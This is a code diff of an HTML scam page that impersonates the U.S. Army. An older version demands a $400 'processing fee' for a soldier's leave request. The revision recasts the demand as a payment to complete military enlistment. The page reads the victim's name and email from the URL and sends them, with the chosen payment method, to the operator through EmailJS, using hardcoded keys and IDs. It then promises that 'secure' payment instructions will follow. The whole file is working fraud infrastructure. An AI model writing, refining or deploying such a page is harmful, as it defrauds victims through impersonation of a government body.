@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>U.S. Army Leave – Payment Processing</title>
+  <title>Complete Registration – U.S. Military</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
@@ -26,16 +26,15 @@
       margin-bottom: 25px;
     }
     h2 {
-      margin: 10px 0 15px;
-      font-size: 22px;
+      margin: 10px 0 20px;
+      font-size: 24px;
     }
     p {
       color: #333;
-      font-size: 15px;
-      line-height: 1.6;
+      font-size: 16px;
     }
     .payment-options {
-      margin-top: 25px;
+      margin-top: 30px;
     }
     .payment-options button {
       width: 100%;
@@ -43,42 +42,44 @@
       border: 1px solid #ddd;
       border-radius: 10px;
       padding: 14px 20px;
-      font-size: 15px;
+      font-size: 16px;
       display: flex;
       align-items: center;
       justify-content: flex-start;
       margin: 10px 0;
       cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .payment-options button:hover {
+      background: #f0f0f0;
     }
     .payment-options img {
-      width: 26px;
-      margin-right: 12px;
+      width: 28px;
+      margin-right: 14px;
     }
     .thank-you {
       display: none;
       margin-top: 30px;
-      padding: 18px;
+      padding: 20px;
       border-radius: 10px;
-      background: #e7f8e7;
-      color: #2a662a;
-      font-size: 15px;
+      background: #e9fbe9;
+      color: #2e662e;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://i.imgur.com/y4DFFMe.png" class="logo" alt="U.S. Army Logo" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Seal_of_the_United_States_Department_of_the_Army.svg/2048px-Seal_of_the_United_States_Department_of_the_Army.svg.png" class="logo" alt="U.S. Army Logo" />
     
-    <h2>Leave Application – Processing Fee</h2>
-    <p>Dear <span id="displayName">Applicant</span>,</p>
-    <p>To proceed with your leave request, a one-time processing fee of <strong>$400</strong> is required.</p>
-    <p>Please select your preferred payment method below. Instructions will be sent to your email immediately.</p>
+    <h2>Complete Your Military Enrollment</h2>
+    <p id="welcome-message">Dear <span id="displayName">Applicant</span>, to finalize your enlistment and receive your official deployment documents, please choose your preferred payment method below.</p>
 
     <form id="paymentForm">
-      <!-- Hidden fields -->
-      <input type="hidden" id="full_name" name="full_name" />
-      <input type="hidden" id="email" name="email" />
-      <input type="hidden" id="payment_method" name="payment_method" />
+      <!-- Hidden dynamic fields -->
+      <input type="hidden" name="full_name" id="full_name" value="" />
+      <input type="hidden" name="email" id="email" value="" />
+      <input type="hidden" name="payment_method" id="payment_method" value="" />
 
       <div class="payment-options">
         <button type="button" onclick="submitPayment('Bank Transfer')">
@@ -101,8 +102,7 @@
 
   <script>
     (function(){
-      // === PLACE YOUR EmailJS PUBLIC KEY BELOW ===
-      emailjs.init("JWcOE8k4MMUEFNPy-");
+      emailjs.init("JWcOE8k4MMUEFNPy-"); // <-- Your Public Key
 
       const urlParams = new URLSearchParams(window.location.search);
       const name = urlParams.get('name') || 'Applicant';
@@ -116,20 +116,20 @@
     function submitPayment(method) {
       document.getElementById("payment_method").value = method;
 
-      // === PLACE YOUR EmailJS SERVICE & TEMPLATE IDs BELOW ===
       emailjs.send("service_96jc01n", "template_uikbtgh", {
         full_name: document.getElementById("full_name").value,
         email: document.getElementById("email").value,
         payment_method: method
       })
       .then(() => {
+        const name = document.getElementById("full_name").value;
         document.querySelector(".payment-options").style.display = "none";
         document.getElementById("thankYouMessage").style.display = "block";
         document.getElementById("thankYouMessage").innerText = 
-          `Thank you. Secure instructions for ${method} will be sent to your email shortly.`;
+          `Thank you, ${name}. Secure instructions for ${method} will be sent to your registered email shortly.`;
       })
       .catch((error) => {
-        alert("Error sending instructions. Please try again.");
+        alert("Failed to send. Please try again later.");
         console.error("EmailJS Error:", error);
       });
     }
